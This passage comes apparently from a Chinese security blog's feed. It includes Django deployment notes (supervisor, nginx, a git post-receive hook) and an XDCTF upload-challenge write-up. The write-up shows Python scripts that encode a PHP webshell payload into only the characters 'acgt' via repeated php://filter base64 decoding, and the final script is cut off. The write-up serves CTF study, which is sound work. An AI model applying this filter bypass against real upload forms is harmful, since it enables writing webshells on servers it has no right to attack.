class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:D0g3_wiki]</span><br><span class="line">command = /home/lucifaer/D0g3_wiki/gunicorn_start ; Command to start app</span><br><span class="line">directory = /home/lucifaer/D0g3_wiki/</span><br><span class="line">user = lucifaer ; User to run as</span><br><span class="line">stdout_logfile = /home/lucifaer/logs/gunicorn_supervisor.log ; Where to write log messages</span><br><span class="line">redirect_stderr = true ; Save stderr in the same log</span><br><span class="line">environment=LANG=en_US.UTF-8,LC_ALL=en_US.UTF-8 ; Set UTF-8 as default encoding</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>日志文件需要手动创建：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch /home/lucifaer/logs/gunicorn_supervisor.log</span><br></pre></td></tr></table></figure><p>接下来用<code>supervisorctl</code>来启动设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo supervisorctl reread </span><br><span class="line">D0g3_wiki: available </span><br><span class="line">$ sudo supervisorctl update </span><br><span class="line">D0g3_wiki: added process group</span><br></pre></td></tr></table></figure><p>之后就可以开启进程了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo supervisorctl start D0g3_wiki</span><br></pre></td></tr></table></figure><h1 id="0x03-Nginx"><a href="#0x03-Nginx" class="headerlink" title="0x03 Nginx"></a>0x03 Nginx</h1><p>Nginx安装步骤就省略了，不要太简单。</p><p>之后我们需要的就是为Django项目创建一个虚拟sever配置。</p><p>每个Nginx的虚拟sever都由<code>/etc/nginx/sites-available</code>路径下的一个配置文件来表示，而将其链接到的<code>/etc/nginx/sites-enabled</code>路径下则可以启用对应的站点。</p><p>我们在<code>/etc/nginx/sites-available</code>为Django项目创建一个配置文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">upstream D0g3_wiki_app_server &#123;</span><br><span class="line"># fail_timeout=0 means we always retry an upstream even if it failed</span><br><span class="line"># to return a good HTTP response (in case the Unicorn master nukes a</span><br><span class="line"># single worker for timing out).</span><br><span class="line"></span><br><span class="line">server unix:/home/lucifaer/D0g3_wiki/D0g3_wiki/run/gunicorn.sock fail_timeout=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">listen 80;</span><br><span class="line">server_name example.com;</span><br><span class="line"></span><br><span class="line">client_max_body_size 4G;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">location /static/ &#123;</span><br><span class="line">alias /home/lucifaer/D0g3_wiki/static/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line"># an HTTP header important enough to have its own Wikipedia entry:</span><br><span class="line"># http://en.wikipedia.org/wiki/X-Forwarded-For</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line"># enable this if and only if you use HTTPS, this helps Rack</span><br><span class="line"># set the proper protocol for doing redirects:</span><br><span class="line"># proxy_set_header X-Forwarded-Proto https;</span><br><span class="line"></span><br><span class="line"># pass the Host: header from the client right along so redirects</span><br><span class="line"># can be set properly within the Rack application</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line"></span><br><span class="line"># we don&apos;t want nginx trying to do something clever with</span><br><span class="line"># redirects, we set the Host: header above already.</span><br><span class="line">proxy_redirect off;</span><br><span class="line"></span><br><span class="line"># set &quot;proxy_buffering off&quot; *only* for Rainbows! when doing</span><br><span class="line"># Comet/long-poll stuff. It&apos;s also safe to set if you&apos;re</span><br><span class="line"># using only serving fast clients with Unicorn + nginx.</span><br><span class="line"># Otherwise you _want_ nginx to buffer responses to slow</span><br><span class="line"># clients, really.</span><br><span class="line"># proxy_buffering off;</span><br><span class="line"></span><br><span class="line"># Try to serve static files from nginx, no point in making an</span><br><span class="line"># *application* server like Unicorn/Rainbows! serve static files.</span><br><span class="line">if (!-f $request_filename) &#123;</span><br><span class="line">proxy_pass 你的代理ip，也就是你的ip(或域名)+8000端口;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Error pages</span><br><span class="line">error_page 500 502 503 504 /500.html;</span><br><span class="line">location = /500.html &#123;</span><br><span class="line">root /home/lucifaer/D0g3_wiki/static/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这个文件链接到<code>site_enabled</code>目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /etc/nginx/sites-available/D0g3_wiki.conf /etc/nginx/sites-enabled/D0g3_wiki.conf</span><br></pre></td></tr></table></figure><p>然后重启Nginx就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service nginx restart</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上一篇。&lt;/p&gt;
    
    </summary>
    
      <category term="环境部署" scheme="https://lucifaer.com/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="环境部署" scheme="https://lucifaer.com/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Git Hooks实现项目的自动部署</title>
    <link href="https://lucifaer.com/2018/02/28/Git%20Hooks%E5%AE%9E%E7%8E%B0%E9%A1%B9%E7%9B%AE%E7%9A%84%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/"/>
    <id>https://lucifaer.com/2018/02/28/Git Hooks实现项目的自动部署/</id>
    <published>2018-02-28T02:56:44.000Z</published>
    <updated>2018-11-29T09:42:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近把自己的wiki重新更新了一下版本，正好以前的服务器到期，把新版本的wiki迁移到新的服务器上，顺手把之前配置的代码自动部署的过程记录下来。</p><p>实现项目的自动部署，最简便的方法就是利用<code>git hooks</code>这个方法。</p><a id="more"></a><h1 id="0x00-什么是git-hooks"><a href="#0x00-什么是git-hooks" class="headerlink" title="0x00 什么是git hooks"></a>0x00 什么是git hooks</h1><p>简单来理解一下，就是一个可以hook<code>git</code>操作，根据<code>git</code>操作来处理之后动作的触发式自定义脚本。</p><p><code>git hooks</code>有两种类型的钩子：客户端和服务端。</p><p>客户端的钩子有：</p><ol><li><code>pre-commit</code> 钩子在commit前运行</li><li><code>prepare-commit-msg</code> 钩子在启动提交信息编辑器前，默认信息被创建后运行。</li><li><code>post-commit</code> 钩子在commit过程完成后运行，对应着的是<code>git commit</code>之后的操作</li><li><code>applypatch-msg</code> 该钩子将提交信息进行格式化规范，或修正格式错误</li><li><code>pre-applypatch</code> 在<code>git am</code>期间运行</li><li><code>post-applypatch</code> 运行于提交后产生，是在<code>git am</code>运行期间最后被调用的钩子</li><li><code>pre-rewrite</code> 钩子被那些会替换提交记录的命令调用</li><li><code>post-checkout</code> 在<code>git checkout</code>成功运行后调用</li><li><code>post-merge</code> 在<code>git merge</code>成功运行后调用</li><li><code>pre-push</code> 在<code>git push</code>运行期间，更新了远程引用但尚未传送对象时被调用</li><li><code>pre-auto-gc</code> 在垃圾回收前被调用</li></ol><p>服务端的钩子有：</p><ol><li><code>pre-receive</code> 处理来自客户端的推送操作时最先被调用</li><li><code>update</code> 它会为每一个准备更新的分支各运行一次</li><li><code>post-receive</code> 在整个过程完成以后运行，可以用来更新其他系统服务或者通知用户</li></ol><h1 id="0x01-使用git-hooks"><a href="#0x01-使用git-hooks" class="headerlink" title="0x01 使用git hooks"></a>0x01 使用git hooks</h1><p>所有的钩子脚本都存放在<code>.git/hooks</code>目录中。当使用<code>git init</code>初始化一个新仓库时，Git默认会子啊这个目录中放置一些示例脚本。这些示例的名字都是以<code>.simple</code>结尾的，如果你想启用他们，首先要移除该后缀，或者重新创建该文件。</p><h2 id="服务端部署"><a href="#服务端部署" class="headerlink" title="服务端部署"></a>服务端部署</h2><p>在服务端部署远程仓库，使用的是<code>git init --bare</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir D0g3_wiki.git</span><br><span class="line">$ cd D0g3_wiki.git/</span><br><span class="line">$ git init --bare</span><br></pre></td></tr></table></figure><p>效果如图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15197850712206.jpg" alt=""></p><p>之后需要我们要在<code>/hooks/</code>下创建<code>post-receive</code>，并写一段shell脚本来自定义我们需要<code>post-receive</code>钩子完成的自定义任务：</p><p>post-receive</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">GIT_REPO=/root/D0g3_wiki.git</span><br><span class="line">TMP_GIT_CLONE=/tmp/D0g3_wiki</span><br><span class="line">PUBLIC_WWW=/home/lucifaer</span><br><span class="line"></span><br><span class="line">echo &quot;init receive&quot;</span><br><span class="line">rm -rf $TMP_GIT_CLONE</span><br><span class="line">if [ -d $PUBLIC_WWW ]; then</span><br><span class="line">    mkdir -p $PUBLIC_WWW</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line"># sudo rm -rf /srv/http/hack_web/hack_web</span><br><span class="line"># sudo cp -r $TMP_GIT_CLONE/hack_web $PUBLIC_WWW</span><br><span class="line">#if [[ $EUID -eq 0 ]]; then</span><br><span class="line">rsync -av $TMP_GIT_CLONE $PUBLIC_WWW</span><br><span class="line">chown -R lucifaer:lucifaer $PUBLIC_WWW</span><br><span class="line">#fi</span><br><span class="line">rm -rf $TMP_GIT_CLONE</span><br></pre></td></tr></table></figure><p>这里是利用了<code>rsync</code>命令来完成远程数据同步，并设定了同步目录为<code>/home/lucifaer</code>。</p><p>完成了shell脚本的编辑后，给该脚本添加可执行权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x post-receive</span><br></pre></td></tr></table></figure><p>至此完成了服务端的部署。</p><h2 id="客户端部署"><a href="#客户端部署" class="headerlink" title="客户端部署"></a>客户端部署</h2><p>客户端并不需要特别的部署什么样的环境，只需要将需要给需要同步的项目建立仓库，并设置remote源就好了。</p><p>比如我要将本地的<code>secspider</code>项目同步到服务端：</p><p>首先给该项目建立本地仓库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd secspider</span><br><span class="line">$ git init .</span><br><span class="line">$ git add .</span><br><span class="line">$ git commit -m &quot;test git hooks&quot;</span><br></pre></td></tr></table></figure><p>之后添加remote源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add nick_name user@ip:/gitrepo_dir</span><br><span class="line">$ git push nick_name master</span><br></pre></td></tr></table></figure><p>这里的<code>nick_name、user、ip</code>设置成自己的名字。</p><p>便同步成功了。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15197866160106.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近把自己的wiki重新更新了一下版本，正好以前的服务器到期，把新版本的wiki迁移到新的服务器上，顺手把之前配置的代码自动部署的过程记录下来。&lt;/p&gt;
&lt;p&gt;实现项目的自动部署，最简便的方法就是利用&lt;code&gt;git hooks&lt;/code&gt;这个方法。&lt;/p&gt;
    
    </summary>
    
      <category term="环境部署" scheme="https://lucifaer.com/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Git" scheme="https://lucifaer.com/tags/Git/"/>
    
      <category term="环境部署" scheme="https://lucifaer.com/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>XDCTF Upload 引发出来的一个新思路</title>
    <link href="https://lucifaer.com/2017/10/09/XDCTF%20Upload%20%E5%BC%95%E5%8F%91%E5%87%BA%E6%9D%A5%E7%9A%84%E4%B8%80%E4%B8%AA%E6%96%B0%E6%80%9D%E8%B7%AF/"/>
    <id>https://lucifaer.com/2017/10/09/XDCTF Upload 引发出来的一个新思路/</id>
    <published>2017-10-09T10:31:09.000Z</published>
    <updated>2018-11-29T09:33:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>在十一的XDCTF中有一道Upload题引出的如何通过固定的几个字符，利用php伪协议中的<code>convert.base64-encode</code>来写shell。</p><a id="more"></a><h1 id="0x00-一道题引出的话题"><a href="#0x00-一道题引出的话题" class="headerlink" title="0x00 一道题引出的话题"></a>0x00 一道题引出的话题</h1><p>我们首先抛砖引玉，来看一下这道题的关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[file]) &amp;&amp; $_FILES[file][<span class="string">'size'</span>] &lt; <span class="number">4</span> ** <span class="number">8</span>) &#123;</span><br><span class="line">$d = <span class="string">"./tmp/"</span> . md5(session_id());</span><br><span class="line">@mkdir($d);</span><br><span class="line">$b = <span class="string">"$d/"</span> . pathinfo($_FILES[file][name], <span class="number">8</span>);</span><br><span class="line">file_put_contents($b, preg_replace(<span class="string">'/[^acgt]/is'</span>, <span class="string">''</span>, file_get_contents($_FILES[file][tmp . <span class="string">"_name"</span>])));</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题限制了使用<code>php://input</code>、<code>data://</code>、<code>read://</code>。关键的考点就是如何过这个正则<code>/[^acgt]/is</code>。</p><p>ok，正则表示我们只能使用<code>acgtACGT</code>这么8个字符，那么我们如何通过这8个字符来写shell呢？</p><p>下面我们就用这8个字符来尝试生成我们的payload，以达到执行我们的php代码的目的。</p><h1 id="0x01-解决问题的关键——base64解码函数tips"><a href="#0x01-解决问题的关键——base64解码函数tips" class="headerlink" title="0x01 解决问题的关键——base64解码函数tips"></a>0x01 解决问题的关键——base64解码函数tips</h1><p>解决上述问题的关键，就是base64的解码规则。</p><p>首先你应该知道的：</p><ul><li>base64使用的字符包括大小写字母26个，加上10个数字，和<code>+</code>、<code>/</code>共64个字符。</li><li>base64在解码时，如果参数中有非法字符（不在上面64个字符内的），就会跳过。</li></ul><p>举个例子：</p><p>以r举例，我们可以看到可以通过<code>ctTT</code>进行base64解码后取得：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15075418544185.jpg" alt=""></p><p>那么我们顺着这个思路，就可以得到一张通过已经给出的8个字符所得到的所有字符的字符表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="comment"># base64基础64字符</span></span><br><span class="line">dict = string.ascii_letters + string.digits + <span class="string">"+/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用可用字符替换其他字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(allow_chars)</span>:</span></span><br><span class="line">    possible = list(product(allow_chars, repeat=<span class="number">4</span>))</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> list_data <span class="keyword">in</span> possible:</span><br><span class="line">        data = <span class="string">""</span>.join(list_data)</span><br><span class="line">        decode_data = base64.b64decode(data)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> decode_data:</span><br><span class="line">            j = chr(i)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">in</span> dict:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = j</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            table[t] = data</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    chars = <span class="string">'acgtACGT'</span></span><br><span class="line">    pprint(exchange(chars))</span><br></pre></td></tr></table></figure><p>代码很简单，就是将<code>acgtACGT</code>取了单位元组为4个元素的笛卡尔积，之后将每个笛卡尔积所组成的新的字符串进行base64解码，结果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15075425250385.jpg" alt=""></p><p>目前只有26个元素，剩下的怎么得到呢？</p><p>我们改一下我们的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="comment"># base64基础64字符</span></span><br><span class="line">dict = string.ascii_letters + string.digits + <span class="string">"+/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用可用字符替换其他字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(allow_chars)</span>:</span></span><br><span class="line">    possible = list(product(allow_chars, repeat=<span class="number">4</span>))</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> list_data <span class="keyword">in</span> possible:</span><br><span class="line">        data = <span class="string">""</span>.join(list_data)</span><br><span class="line">        decode_data = base64.b64decode(data)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> decode_data:</span><br><span class="line">            j = chr(i)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">in</span> dict:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = j</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            table[t] = data</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">limited_exchanging</span><span class="params">(allow_chars)</span>:</span></span><br><span class="line">    tables = []</span><br><span class="line">    saved_length = <span class="number">0</span></span><br><span class="line">    flag = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        table = exchange(allow_chars)</span><br><span class="line">        length = len(table.keys())</span><br><span class="line">        <span class="keyword">if</span> saved_length == length:</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        saved_length = length</span><br><span class="line">        print(<span class="string">"[+] Got %d chars: %s"</span> % (length, table.keys()))</span><br><span class="line">        tables.append(table)</span><br><span class="line">        allow_chars = table.keys()</span><br><span class="line">        <span class="keyword">if</span> set(table.keys()) &gt;= set(dict):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">return</span> tables</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    chars = <span class="string">'acgtACGT'</span></span><br><span class="line">    pprint(limited_exchanging(chars))</span><br></pre></td></tr></table></figure><p>最后可以得到这样的映射表：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15075430420240.jpg" alt=""></p><p>图很长，就不截了。</p><p>通过base64解码的特性，我们将8个字符拓展到了64个字符，接下来就是将我们的原数据进行转换就好了。</p><h1 id="0x02-剩下的一些要注意的点"><a href="#0x02-剩下的一些要注意的点" class="headerlink" title="0x02 剩下的一些要注意的点"></a>0x02 剩下的一些要注意的点</h1><h2 id="1-decode次数的问题"><a href="#1-decode次数的问题" class="headerlink" title="1. decode次数的问题"></a>1. decode次数的问题</h2><p>根据上面的代码，我们只需要<code>len(tables)</code>就可以知道我们转换经历了几次的过程，这边<code>len(tables)</code>是3次。</p><p>需要注意的是，在利用<code>php://filter/convert.base64-decode/resource=</code>的时候，需要<code>len(tables) + 1</code>，也就是说是4次，没毛病吧。</p><h2 id="2-在利用我们得出的映射表时，怎么迭代向前替换问题"><a href="#2-在利用我们得出的映射表时，怎么迭代向前替换问题" class="headerlink" title="2. 在利用我们得出的映射表时，怎么迭代向前替换问题"></a>2. 在利用我们得出的映射表时，怎么迭代向前替换问题</h2><p>将<code>tables</code>list从后向前遍历，最后得到的即为全部是指定字符的payload。</p><h1 id="0x03-最终的脚本"><a href="#0x03-最终的脚本" class="headerlink" title="0x03 最终的脚本"></a>0x03 最终的脚本</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line">import os</span><br><span class="line">from itertools import product</span><br><span class="line"><span class="comment"># base64基础64字符</span></span><br><span class="line">dict = string.ascii_letters + string.digits + <span class="string">"+/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到payload完成base64编码后需要进行替换的向量</span></span><br><span class="line">def payload_base64_encode(data):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).decode().replace(<span class="string">"\n"</span>, <span class="string">""</span>).replace(<span class="string">"="</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用可用字符替换其他字符</span></span><br><span class="line">def exchange(allow_chars):</span><br><span class="line">    possible = <span class="keyword">list</span>(product(allow_chars, repeat=<span class="number">4</span>))</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> list_data in possible:</span><br><span class="line">        data = <span class="string">""</span>.join(list_data)</span><br><span class="line">        decode_data = base64.b64decode(data)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i in decode_data:</span><br><span class="line">            j = chr(i)</span><br><span class="line">            <span class="keyword">if</span> j in dict:</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                t = j</span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">            table[t] = data</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代得出完整的映射表</span></span><br><span class="line">def limited_exchanging(allow_chars):</span><br><span class="line">    tables = []</span><br><span class="line">    saved_length = <span class="number">0</span></span><br><span class="line">    flag = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        table = exchange(allow_chars)</span><br><span class="line">        length = len(table.keys())</span><br><span class="line">        <span class="keyword">if</span> saved_length == length:</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        saved_length = length</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Got %d exchange_chars: %s"</span> % (length, table.keys()))</span><br><span class="line">        tables.append(table)</span><br><span class="line">        allow_chars = table.keys()</span><br><span class="line">        <span class="keyword">if</span> set(table.keys()) &gt;= set(dict):</span><br><span 